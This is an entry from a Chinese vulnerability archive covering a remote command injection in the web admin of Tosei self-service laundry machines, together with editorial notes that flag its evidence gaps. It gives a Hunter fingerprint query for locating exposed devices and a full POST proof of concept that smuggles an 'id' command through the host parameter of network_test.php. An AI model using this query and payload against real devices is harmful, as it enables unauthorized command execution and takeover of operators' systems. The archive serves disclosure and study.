---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "Tosei自助洗衣机web管理端network_test.php文件host参数远程命令执行漏洞"
product: "Tosei自助洗衣机Web管理端"
record_type: "vulnerability"
document_type: "命令注入简要PoC"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "无型号/固件/角色范围；请求未带Cookie但不足单独证明未认证"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/Tosei%E8%87%AA%E5%8A%A9%E6%B4%97%E8%A1%A3%E6%9C%BAweb%E7%AE%A1%E7%90%86%E7%AB%AFnetwork_test.php%E6%96%87%E4%BB%B6host%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
hunter: "web.body=\"tosei_login_check.php\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/bihozhmkgaeqymw2"
id: "vw-57d60b6d3421289033197776"
entity_id: "ve-57d60b6d3421289033197776"
schema_version: "1"
previous_fofa_unverified: "web.body="
---

# Tosei自助洗衣机web管理端network_test.php文件host参数远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Tosei自助洗衣机Web管理端
- 文献类型：命令注入简要PoC
- 版本、权限及部署边界：无型号/固件/角色范围；请求未带Cookie但不足单独证明未认证
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 文称出现如下页面但没有页面图/响应，仅访问URL不能判存在漏洞
2. host换行注入且command=ping的原语清楚，但无命令回显、源码和负对照；任意权限受服务账户约束
3. fofa字段是残缺Hunter语法应分引擎；影响版本仅产品名、修复/厂商公告缺
4. 宜归设备/IoT并保留Web接口交叉索引

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/bihozhmkgaeqymw2>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
Tosei 自助洗衣机 是日本 Tosei 公司的一个产品。Tosei 自助洗衣机 web 管理端存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令执行,在服务器任意执行代码，获取服务器权限，进而控制整个服务器。

# 二、影响版本
+ Tosei 自助洗衣机 web 管理端

# 三、资产测绘
+ hunter`web.body="tosei_login_check.php"`
+ 特征


# 四、漏洞复现
访问poc出现如下页面表示可能存在漏洞

```plain
/cgi-bin/network_test.php
```


修改host参数为想要执行的命令

```plain
POST /cgi-bin/network_test.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Connection: close
Upgrade-Insecure-Requests: 1

host=%0aid%0a&command=ping
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bihozhmkgaeqymw2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
